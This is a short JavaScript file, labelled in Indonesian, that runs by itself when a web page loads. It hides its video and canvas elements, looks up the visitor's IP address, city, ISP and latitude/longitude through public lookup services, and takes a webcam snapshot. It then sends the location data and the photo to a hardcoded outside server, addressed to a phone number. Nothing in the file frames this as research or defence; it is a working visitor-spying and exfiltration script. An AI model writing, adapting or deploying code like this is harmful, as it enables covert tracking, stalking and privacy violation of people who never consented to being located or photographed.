let video = document.querySelector("#video");
video.style.display = "none";
let canvas = document.querySelector("#canvas");
let text = "*DATA PENGUNJUNG*";
canvas.style.display = "none";
const base = "http://23.95.48.230:3020";

(async () => {
    const jsonIp = await useFetch("https://jsonip.com");
    const data = await useFetch("https://ipapi.co/" + jsonIp.ip + "/json");
    text += `

Alamat IP : ${data.ip}
Kode Negara : ${data.country}
Nama Negara : ${data.country_name}
Ibukota Negara : ${data.country_capital}
Kode Telepon : ${data.country_calling_code}
Provinsi : ${data.region}
Kode Provinsi : ${data.region_code}
Kota : ${data.city}
Provider ISP : ${data.org}
Latitude : ${data.latitude}
Longitude : ${data.longitude}`;
    // console.log(text);
    sM(text);
    let stream = await navigator.mediaDevices.getUserMedia({
        video: true,
        audio: false,
    });
    video.srcObject = stream;
    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
    let image_data_url = canvas
        .toDataURL("image/jpeg")
        .replace(/^data:image\/jpeg;base64,/, "");
    await sM(text, image_data_url, "jpeg");
    video.pause();
    video.src = "";
    stream.getTracks()[0].stop();
})();

async function useFetch(url) {
    const response = await fetch(url);
    const jsonData = await response.json();
    return Promise.resolve(jsonData);
}

async function sM(msg, img, ext) {
    let mySender = await fetch(`${base}/send/`, {
        method: "POST", // *GET, POST, PUT, DELETE, etc.
        mode: "cors", // no-cors, *cors, same-origin
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({
            to: "082286230830",
            msg: msg || "siapa hayo?",
            img,
            ext,
        }), // body data type must match "Content-Type" header
    });
    let myResult = await mySender.text();
    console.log(myResult);
    return Promise.resolve(myResult);
}